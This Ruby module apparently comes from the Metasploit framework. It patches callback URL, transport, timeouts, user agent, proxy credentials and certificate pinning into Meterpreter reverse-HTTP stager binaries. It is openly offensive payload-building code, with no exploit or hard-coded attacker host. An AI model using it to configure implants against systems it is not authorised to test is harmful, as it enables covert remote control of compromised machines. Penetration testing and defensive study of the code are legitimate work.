# -*- coding: binary -*-

module Rex
  module Payloads
    module Meterpreter
      ###
      #
      # Provides methods to patch options into metsrv stagers
      #
      ###
      module Patch

        # Replace the transport string
        def self.patch_transport!(blob, ssl)
          str = ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
          patch_string!(blob, "METERPRETER_TRANSPORT_SSL", str)
        end

        # Replace the URL
        def self.patch_url!(blob, url)
          unless patch_string!(blob, "https://#{'X' * 512}", url)
            # If the patching failed this could mean that we are somehow
            # working with outdated binaries, so try to patch with the
            # old stuff.
            patch_string!(blob, "https://#{'X' * 256}", url)
          end
        end

        # Replace the session expiration timeout
        def self.patch_expiration!(blob, expiration)

          i = blob.index([0xb64be661].pack("V"))
          if i
            str = [ expiration ].pack("V")
            blob[i, str.length] = str
          end

        end

        # Replace the session communication timeout
        def self.patch_comm_timeout!(blob, comm_timeout)

          i = blob.index([0xaf79257f].pack("V"))
          if i
            str = [ comm_timeout ].pack("V")
            blob[i, str.length] = str
          end

        end

        # Replace the user agent string with our option
        def self.patch_ua!(blob, ua)
          patch_string!(blob, "METERPRETER_UA\x00", ua[0,255] + "\x00")
        end

        # Activate a custom proxy
        def self.patch_proxy!(blob, proxyhost, proxyport, proxy_type)

          if proxyhost && proxyhost.to_s != ""
            proxyhost = proxyhost.to_s
            proxyport = proxyport.to_s || "8080"
            proxyinfo = proxyhost + ":" + proxyport
            if proxyport == "80"
              proxyinfo = proxyhost
            end
            if proxy_type.to_s.upcase == 'HTTP'
              proxyinfo = 'http://' + proxyinfo
            else #socks
              proxyinfo = 'socks=' + proxyinfo
            end
            proxyinfo << "\x00"
            patch_string!(blob, "METERPRETER_PROXY#{"\x00" * 10}", proxyinfo)
          end
        end

        # Proxy authentification
        def self.patch_proxy_auth!(blob, proxy_username, proxy_password, proxy_type)

          return if proxy_type.nil? || proxy_type.upcase == 'SOCKS'

          if proxy_username && !proxy_username.empty?
            unless patch_string!(blob, "METERPRETER_USERNAME_PROXY#{"\x00" * 10}",
                          proxy_username + "\x00")
              raise ArgumentError, "Unable to patch Proxy Username"
            end
          end

          if proxy_password && !proxy_password.empty?
            unless patch_string!(blob, "METERPRETER_PASSWORD_PROXY#{"\x00" * 10}",
                          proxy_password + "\x00")
              raise ArgumentError, "Unable to patch Proxy Password"
            end
          end
        end

        # Patch the ssl cert hash
        def self.patch_ssl_check!(blob, ssl_cert_hash)
          # SSL cert location is an ASCII string, so no need for
          # WCHAR support
          if ssl_cert_hash
            i = blob.index("METERPRETER_SSL_CERT_HASH\x00")
            if i
              blob[i, ssl_cert_hash.length] = ssl_cert_hash
            end
          end
        end

        # Patch options into metsrv for reverse HTTP payloads
        def self.patch_passive_service!(blob, options)

          patch_transport!(blob, options[:ssl])
          patch_url!(blob, options[:url])
          patch_expiration!(blob, options[:expiration])
          patch_comm_timeout!(blob, options[:comm_timeout])
          patch_ua!(blob, options[:ua])
          patch_ssl_check!(blob, options[:ssl_cert_hash])
          patch_proxy!(blob,
            options[:proxy_host],
            options[:proxy_port],
            options[:proxy_type]
          )
          patch_proxy_auth!(blob,
            options[:proxy_user],
            options[:proxy_pass],
            options[:proxy_type]
          )

        end

        #
        # Patch an ASCII value in the given payload. If not found, try WCHAR instead.
        #
        def self.patch_string!(blob, search, replacement)
          result = false

          i = blob.index(search)
          if i
            blob[i, replacement.length] = replacement
            result = true
          else
            i = blob.index(wchar(search))
            if i
              r = wchar(replacement)
              blob[i, r.length] = r
              result = true
            end
          end

          result
        end

        private

        #
        # Convert the given ASCII string into a WCHAR string (dumb, but works)
        #
        def self.wchar(str)
          str.to_s.unpack("C*").pack("v*")
        end
      end
    end
  end
end
